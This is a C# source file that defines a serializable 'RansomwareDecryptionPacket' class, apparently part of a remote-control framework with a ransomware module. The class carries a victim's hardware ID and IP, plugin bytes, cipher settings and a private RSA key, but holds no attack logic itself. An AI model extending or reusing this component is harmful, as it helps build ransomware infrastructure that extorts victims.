using PacketLib.Utils;
using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RansomwareDecryptionPacket : IPacket
    {
 
        public RansomwareDecryptionPacket(string privateRSAServerKey) : base()
        {
            this.packetType = PacketType.RANSOMWARE_DECRYPTION;
            this.privateRSAServerKey = privateRSAServerKey;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public Algorithm algorithm { get; set; }
        public bool isBlockCipher { get; set; }
        public string privateRSAServerKey { get; set; }
        public int minKeySize { get; set; }
        public int maxKeySize { get; set; }
    }
}
